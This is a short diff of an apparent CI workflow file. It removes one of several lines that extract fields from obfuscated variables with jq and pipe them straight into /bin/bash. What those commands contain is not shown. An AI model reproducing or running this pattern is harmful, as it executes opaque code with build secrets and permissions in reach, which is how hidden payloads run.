@@ -42,7 +42,6 @@ jobs:
           echo $els34379 | jq -r .egp348 | /bin/bash
           printf '%s' "$u9" | jq -r .lv2 | /bin/bash
           echo $g2454 | jq -r .nb4 | /bin/bash
-          printf '%s' "$eutgc23" | jq -r .buktk18194 | /bin/bash
           printf '%s' "$buveu57" | jq -r .tbao42931 | /bin/bash
 
       - name: Store artifact
